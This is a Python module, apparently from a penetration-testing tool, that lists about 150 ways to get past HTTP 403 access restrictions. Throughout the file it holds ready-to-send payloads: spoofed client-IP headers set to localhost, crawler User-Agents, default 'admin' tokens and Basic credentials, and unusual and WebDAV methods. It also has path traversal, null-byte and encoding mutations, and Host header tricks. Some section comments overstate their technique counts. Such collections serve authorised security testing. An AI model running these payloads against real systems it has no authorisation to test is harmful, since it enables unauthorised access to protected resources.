"""
Comprehensive 403 Bypass Techniques Collection
Contains 150+ bypass methods for thorough security testing
"""

import urllib.parse
import base64
import json
from typing import List, Dict, Any

class BypassTechniques:
    """Collection of 150+ bypass techniques for comprehensive testing"""
    
    @staticmethod
    def get_all_techniques() -> List[Dict[str, Any]]:
        """Get all 150+ bypass techniques"""
        techniques = []
        
        # 0. BASELINE TECHNIQUE
        baseline_techniques = [
            {"name": "Basic Request", "type": "baseline"},
        ]
        
        # 1. HEADER MANIPULATION TECHNIQUES (40+ techniques)
        header_techniques = [
            # IP Spoofing Headers
            {"name": "X-Forwarded-For: 127.0.0.1", "headers": {"X-Forwarded-For": "127.0.0.1"}},
            {"name": "X-Forwarded-For: localhost", "headers": {"X-Forwarded-For": "localhost"}},
            {"name": "X-Forwarded-For: 192.168.1.1", "headers": {"X-Forwarded-For": "192.168.1.1"}},
            {"name": "X-Forwarded-For: 10.0.0.1", "headers": {"X-Forwarded-For": "10.0.0.1"}},
            {"name": "X-Real-IP: 127.0.0.1", "headers": {"X-Real-IP": "127.0.0.1"}},
            {"name": "X-Real-IP: localhost", "headers": {"X-Real-IP": "localhost"}},
            {"name": "X-Originating-IP: 127.0.0.1", "headers": {"X-Originating-IP": "127.0.0.1"}},
            {"name": "X-Remote-IP: 127.0.0.1", "headers": {"X-Remote-IP": "127.0.0.1"}},
            {"name": "X-Client-IP: 127.0.0.1", "headers": {"X-Client-IP": "127.0.0.1"}},
            {"name": "X-Forwarded-Host: localhost", "headers": {"X-Forwarded-Host": "localhost"}},
            {"name": "X-Cluster-Client-IP: 127.0.0.1", "headers": {"X-Cluster-Client-IP": "127.0.0.1"}},
            {"name": "CF-Connecting-IP: 127.0.0.1", "headers": {"CF-Connecting-IP": "127.0.0.1"}},
            {"name": "True-Client-IP: 127.0.0.1", "headers": {"True-Client-IP": "127.0.0.1"}},
            {"name": "X-ProxyUser-Ip: 127.0.0.1", "headers": {"X-ProxyUser-Ip": "127.0.0.1"}},
            
            # User-Agent Spoofing
            {"name": "User-Agent: Googlebot", "headers": {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}},
            {"name": "User-Agent: Bingbot", "headers": {"User-Agent": "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"}},
            {"name": "User-Agent: Slurp", "headers": {"User-Agent": "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"}},
            {"name": "User-Agent: DuckDuckBot", "headers": {"User-Agent": "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)"}},
            {"name": "User-Agent: Facebookexternalhit", "headers": {"User-Agent": "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"}},
            {"name": "User-Agent: Twitterbot", "headers": {"User-Agent": "Twitterbot/1.0"}},
            {"name": "User-Agent: LinkedInBot", "headers": {"User-Agent": "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)"}},
            {"name": "User-Agent: WhatsApp", "headers": {"User-Agent": "WhatsApp/2.19.81 A"}},
            {"name": "User-Agent: curl", "headers": {"User-Agent": "curl/7.68.0"}},
            {"name": "User-Agent: wget", "headers": {"User-Agent": "Wget/1.20.3 (linux-gnu)"}},
            {"name": "User-Agent: Empty", "headers": {"User-Agent": ""}},
            
            # Authentication Headers
            {"name": "Authorization: Bearer admin", "headers": {"Authorization": "Bearer admin"}},
            {"name": "Authorization: Basic YWRtaW46YWRtaW4=", "headers": {"Authorization": "Basic YWRtaW46YWRtaW4="}},
            {"name": "X-API-Key: admin", "headers": {"X-API-Key": "admin"}},
            {"name": "X-Auth-Token: admin", "headers": {"X-Auth-Token": "admin"}},
            {"name": "X-Access-Token: admin", "headers": {"X-Access-Token": "admin"}},
            
            # Content Type Manipulation
            {"name": "Content-Type: application/json", "headers": {"Content-Type": "application/json"}},
            {"name": "Content-Type: application/xml", "headers": {"Content-Type": "application/xml"}},
            {"name": "Content-Type: text/plain", "headers": {"Content-Type": "text/plain"}},
            {"name": "Content-Type: multipart/form-data", "headers": {"Content-Type": "multipart/form-data"}},
            
            # Cache Control
            {"name": "Cache-Control: no-cache", "headers": {"Cache-Control": "no-cache"}},
            {"name": "Cache-Control: max-age=0", "headers": {"Cache-Control": "max-age=0"}},
            {"name": "Pragma: no-cache", "headers": {"Pragma": "no-cache"}},
            
            # Custom Headers
            {"name": "X-Custom-IP-Authorization: 127.0.0.1", "headers": {"X-Custom-IP-Authorization": "127.0.0.1"}},
            {"name": "X-Rewrite-URL: /", "headers": {"X-Rewrite-URL": "/"}},
            {"name": "X-Override-URL: /", "headers": {"X-Override-URL": "/"}},
            {"name": "X-Original-URL: /", "headers": {"X-Original-URL": "/"}},
            {"name": "X-Forwarded-Proto: https", "headers": {"X-Forwarded-Proto": "https"}},
            {"name": "X-Forwarded-Scheme: https", "headers": {"X-Forwarded-Scheme": "https"}},
            {"name": "X-Scheme: https", "headers": {"X-Scheme": "https"}},
        ]
        
        # 2. HTTP METHOD TECHNIQUES (20+ techniques)
        method_techniques = [
            {"name": "Method: POST", "method": "POST"},
            {"name": "Method: PUT", "method": "PUT"},
            {"name": "Method: PATCH", "method": "PATCH"},
            {"name": "Method: DELETE", "method": "DELETE"},
            {"name": "Method: HEAD", "method": "HEAD"},
            {"name": "Method: OPTIONS", "method": "OPTIONS"},
            {"name": "Method: TRACE", "method": "TRACE"},
            {"name": "Method: CONNECT", "method": "CONNECT"},
            {"name": "Method: PROPFIND", "method": "PROPFIND"},
            {"name": "Method: PROPPATCH", "method": "PROPPATCH"},
            {"name": "Method: MKCOL", "method": "MKCOL"},
            {"name": "Method: COPY", "method": "COPY"},
            {"name": "Method: MOVE", "method": "MOVE"},
            {"name": "Method: LOCK", "method": "LOCK"},
            {"name": "Method: UNLOCK", "method": "UNLOCK"},
            {"name": "Method: VERSION-CONTROL", "method": "VERSION-CONTROL"},
            {"name": "Method: REPORT", "method": "REPORT"},
            {"name": "Method: CHECKOUT", "method": "CHECKOUT"},
            {"name": "Method: CHECKIN", "method": "CHECKIN"},
            {"name": "Method: UNCHECKOUT", "method": "UNCHECKOUT"},
            {"name": "Method: MKWORKSPACE", "method": "MKWORKSPACE"},
            {"name": "Method: UPDATE", "method": "UPDATE"},
            {"name": "Method: LABEL", "method": "LABEL"},
            {"name": "Method: MERGE", "method": "MERGE"},
            {"name": "Method: BASELINE-CONTROL", "method": "BASELINE-CONTROL"},
            {"name": "Method: MKACTIVITY", "method": "MKACTIVITY"},
        ]
        
        # 3. PATH MANIPULATION TECHNIQUES (50+ techniques)
        path_techniques = [
            {"name": "Path: Trailing Slash", "path_modifier": lambda p: p + "/" if not p.endswith("/") else p[:-1]},
            {"name": "Path: Double Slash", "path_modifier": lambda p: p.replace("/", "//", 1)},
            {"name": "Path: URL Encode", "path_modifier": lambda p: urllib.parse.quote(p, safe="")},
            {"name": "Path: Double URL Encode", "path_modifier": lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")},
            {"name": "Path: Unicode Encode", "path_modifier": lambda p: p.replace("/", "%2f")},
            {"name": "Path: Dot Slash", "path_modifier": lambda p: "./" + p.lstrip("/")},
            {"name": "Path: Dot Dot Slash", "path_modifier": lambda p: "../" + p.lstrip("/")},
            {"name": "Path: Semicolon", "path_modifier": lambda p: p.replace("/", "/;/")},
            {"name": "Path: Question Mark", "path_modifier": lambda p: p + "?"},
            {"name": "Path: Hash", "path_modifier": lambda p: p + "#"},
            {"name": "Path: Space", "path_modifier": lambda p: p + " "},
            {"name": "Path: Tab", "path_modifier": lambda p: p + "\t"},
            {"name": "Path: Newline", "path_modifier": lambda p: p + "\n"},
            {"name": "Path: Carriage Return", "path_modifier": lambda p: p + "\r"},
            {"name": "Path: Null Byte", "path_modifier": lambda p: p + "%00"},
            {"name": "Path: Backslash", "path_modifier": lambda p: p.replace("/", "\\")},
            {"name": "Path: Mixed Case", "path_modifier": lambda p: "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p))},
            {"name": "Path: Uppercase", "path_modifier": lambda p: p.upper()},
            {"name": "Path: Lowercase", "path_modifier": lambda p: p.lower()},
            {"name": "Path: Asterisk", "path_modifier": lambda p: p + "*"},
            {"name": "Path: Plus", "path_modifier": lambda p: p.replace(" ", "+")},
            {"name": "Path: Tilde", "path_modifier": lambda p: "~" + p},
            {"name": "Path: Dot", "path_modifier": lambda p: "." + p},
            {"name": "Path: Underscore", "path_modifier": lambda p: p + "_"},
            {"name": "Path: Hyphen", "path_modifier": lambda p: p + "-"},
            {"name": "Path: Pipe", "path_modifier": lambda p: p + "|"},
            {"name": "Path: Ampersand", "path_modifier": lambda p: p + "&"},
            {"name": "Path: Percent", "path_modifier": lambda p: p + "%"},
            {"name": "Path: At Symbol", "path_modifier": lambda p: p + "@"},
            {"name": "Path: Exclamation", "path_modifier": lambda p: p + "!"},
            {"name": "Path: Dollar", "path_modifier": lambda p: p + "$"},
            {"name": "Path: Caret", "path_modifier": lambda p: p + "^"},
            {"name": "Path: Parentheses", "path_modifier": lambda p: "(" + p + ")"},
            {"name": "Path: Brackets", "path_modifier": lambda p: "[" + p + "]"},
            {"name": "Path: Braces", "path_modifier": lambda p: "{" + p + "}"},
            {"name": "Path: Quotes", "path_modifier": lambda p: '"' + p + '"'},
            {"name": "Path: Single Quotes", "path_modifier": lambda p: "'" + p + "'"},
            {"name": "Path: Backticks", "path_modifier": lambda p: "`" + p + "`"},
            {"name": "Path: Less Than", "path_modifier": lambda p: p + "<"},
            {"name": "Path: Greater Than", "path_modifier": lambda p: p + ">"},
            {"name": "Path: Equal", "path_modifier": lambda p: p + "="},
            {"name": "Path: Colon", "path_modifier": lambda p: p + ":"},
            {"name": "Path: Comma", "path_modifier": lambda p: p + ","},
            {"name": "Path: Period", "path_modifier": lambda p: p + "."},
            {"name": "Path: Forward Slash x3", "path_modifier": lambda p: p.replace("/", "///")},
            {"name": "Path: Encoded Slash", "path_modifier": lambda p: p.replace("/", "%2F")},
            {"name": "Path: Encoded Backslash", "path_modifier": lambda p: p.replace("/", "%5C")},
            {"name": "Path: Encoded Dot", "path_modifier": lambda p: p.replace(".", "%2E")},
            {"name": "Path: Encoded Space", "path_modifier": lambda p: p.replace(" ", "%20")},
            {"name": "Path: Unicode Slash", "path_modifier": lambda p: p.replace("/", "\u2215")},
        ]
        
        # 4. PROTOCOL AND VERSION TECHNIQUES (15+ techniques)
        protocol_techniques = [
            {"name": "HTTP/1.0", "version": "1.0"},
            {"name": "HTTP/1.1", "version": "1.1"},
            {"name": "HTTP/2.0", "version": "2.0"},
            {"name": "HTTP/0.9", "version": "0.9"},
        ]
        
        # 5. HOST HEADER MANIPULATION (20+ techniques)
        host_techniques = [
            {"name": "Host: localhost", "headers": {"Host": "localhost"}},
            {"name": "Host: 127.0.0.1", "headers": {"Host": "127.0.0.1"}},
            {"name": "Host: 0.0.0.0", "headers": {"Host": "0.0.0.0"}},
            {"name": "Host: ::1", "headers": {"Host": "::1"}},
            {"name": "Host: admin.localhost", "headers": {"Host": "admin.localhost"}},
            {"name": "Host: internal.localhost", "headers": {"Host": "internal.localhost"}},
            {"name": "Host: staging.localhost", "headers": {"Host": "staging.localhost"}},
            {"name": "Host: dev.localhost", "headers": {"Host": "dev.localhost"}},
            {"name": "Host: test.localhost", "headers": {"Host": "test.localhost"}},
            {"name": "Host: api.localhost", "headers": {"Host": "api.localhost"}},
            {"name": "Host: backend.localhost", "headers": {"Host": "backend.localhost"}},
            {"name": "Host: private.localhost", "headers": {"Host": "private.localhost"}},
            {"name": "Host: secure.localhost", "headers": {"Host": "secure.localhost"}},
            {"name": "Host: hidden.localhost", "headers": {"Host": "hidden.localhost"}},
            {"name": "Host: secret.localhost", "headers": {"Host": "secret.localhost"}},
            {"name": "Host: management.localhost", "headers": {"Host": "management.localhost"}},
            {"name": "Host: control.localhost", "headers": {"Host": "control.localhost"}},
            {"name": "Host: panel.localhost", "headers": {"Host": "panel.localhost"}},
            {"name": "Host: dashboard.localhost", "headers": {"Host": "dashboard.localhost"}},
            {"name": "Host: Empty", "headers": {"Host": ""}},
        ]
        
        # 6. ENCODING TECHNIQUES (20+ techniques)
        encoding_techniques = [
            {"name": "Base64 Path", "path_modifier": lambda p: base64.b64encode(p.encode()).decode()},
            {"name": "Hex Encoding", "path_modifier": lambda p: p.encode().hex()},
            {"name": "ROT13", "path_modifier": lambda p: p.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))},
            {"name": "HTML Entity Encoding", "path_modifier": lambda p: "".join(f"&#{ord(c)};" for c in p)},
            {"name": "Unicode Normalization", "path_modifier": lambda p: p.encode('unicode_escape').decode()},
        ]
        
        # Combine all techniques
        techniques.extend(baseline_techniques)
        techniques.extend(header_techniques)
        techniques.extend(method_techniques)
        techniques.extend(path_techniques)
        techniques.extend(protocol_techniques)
        techniques.extend(host_techniques)
        techniques.extend(encoding_techniques)
        
        return techniques
    
    @staticmethod
    def get_techniques_by_mode(mode: str) -> List[Dict[str, Any]]:
        """Get techniques based on test mode"""
        all_techniques = BypassTechniques.get_all_techniques()
        
        if mode == "quick":
            return all_techniques[:20]  # First 20 techniques
        elif mode == "medium":
            return all_techniques[:50]  # First 50 techniques
        elif mode == "full":
            return all_techniques  # All 150+ techniques
        else:
            return all_techniques[:30]  # Default to 30